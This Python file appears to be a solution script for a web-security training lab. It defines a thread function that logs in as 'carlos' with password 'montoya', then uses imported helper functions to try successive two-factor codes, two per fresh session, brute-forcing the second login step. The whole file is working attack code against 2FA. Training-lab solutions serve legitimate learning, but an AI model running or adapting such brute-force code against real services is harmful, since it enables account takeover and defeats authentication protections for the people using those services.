from _2FA_first_request import first
from _2FA_second_request import second
import http.client

def brute_thread(conObj, i, j):
    params = {"username": "carlos", "password": "montoya"}

    conn = http.client.HTTPSConnection(conObj)

    for k in range(i, j, 2):
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
        cookie = first(conn, headers, params)
        headers["Cookie"] = cookie

        second(conn, headers, None, k)
        second(conn, headers, None, k+1)
    conn.close()
